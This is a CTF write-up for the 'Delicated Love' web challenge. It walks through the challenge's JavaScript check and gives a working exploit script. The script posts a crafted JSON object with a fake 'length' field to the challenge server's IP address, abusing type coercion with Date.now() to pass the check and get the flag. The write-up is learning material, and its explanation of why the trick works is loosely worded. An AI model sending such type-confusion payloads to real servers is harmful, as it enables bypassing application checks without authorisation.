---
title: Delicated Love - Wanna
tags: [CTF]

---

---
title: "WannagameFreshman2025"
tags: CTF, Web, PortSwigger-2024
robots: index, follow
lang: en,vn
breaks: true
---

# Delicated Writeup

[TOC]

## How it works
First , we try to access a web and the admin say that you need to comfort a girl in order to get the flag. 

There is nothing to do with the Ui design of the website or the main.js or any requests that you send to the server

## The problem

But There is a outdated source where it keeps the the source code of the website or being specific is the heart position for winning the girl's heart

Looking carefully for the `javascript code` , we could see the line that:
```javascript
    function stringToFloat(str) {
             let result = 0;
             for (let i = 0; i < str.length; i++) {
                 const code = str.charCodeAt(i);
                 result += code;
                 result /= 256;
             }
             return result;
         }
```
This mean that we convert a string in to a number (float number) base on the ASCII text, with the `str.length` and `i` for returning result

Next, we could see the `isLoveSequence` function for creating out `heart` and `padding`
```javascript
function isLoveSequence(heart, padding = heart.length + Date.now()) {
             let xProd = padding;
             let yProd = padding;
             for (let i = 0; i < heart.length; i++) {
                 // Only the most delicate person in love would try their best to comfort her.
                 const { x, y } = heart[i];
                 xProd *= x;
                 yProd *= y;
             }
```
And its condition for having the girl's love
```javascript
return (xProd === stringToFloat("love") &&
                 yProd === stringToFloat("you"));
         }
```

We could see 1 important information is that we must have the value of `stringToFloat` of `love` for `x`, `you` for `y`, and take both of them divide for padding.`Notice`: it must be the same value and being converted exactly like the string

But when we look at the code, we see that `padding = heart.length + Date.now()` with heart is a string but it is updatedly frequently of the data.now for the exact realtime 

==> the number convert will not fit the condition



## The solution

Look 1 more time we say that there aren't any conditions for `heart` meaning that we can freely create the length for the heart.length to execute only 1 time with `heart[0]`

From that, we will change the `position` for rewrite the index for `heart[i]` 

This is my script for exploiting:
```javascript=
(async()=>{
 function stringToFloat(str){
    let result = 0;
    for (let i = 0;i < str.length; i++){
        const code = str.charCodeAt(i);
        result += code;
        result /= 256;
       }
       return result;
}


const new_length = [0.9999999999999999]
const love = stringToFloat("love") / new_length;
const you = stringToFloat("you") / new_length
  const position = {"0":{"x":love,"y":you} , "length" : new_length}
  console.log("send heart position", position);
  const resp = await fetch("http://61.28.236.247:9001/", {
     method : "POST",
     headers: {"Content-Type": "application/json" },
     body: JSON.stringify({ pos: position }),
  });

   const data = await resp.json();
   console.log("Server response:", data);
})();

```


### Why it works

1. I create the string for the heart and immedialetely `+date.now()`, this is call non-primitive and primitive, meaning the heart being converted into str and force the`datetime.now()` become a str too , so the result will sth like this `0.99999999999999991xxxxxxxxxxxx`, from that the value from `new_length` is not considerable and won't be count as number
2. When the server uses xProd *= x, yProd *= y then it is allowed for the data type number. It will cast x and y from string to number for calculation. It will return the number type to satisfy the server's === permission because it requires the correct data type and value


running the script and we get the flag:




![Screenshot 2025-10-18 210336](https://hackmd.io/_uploads/H1j_0z-0gx.png)




















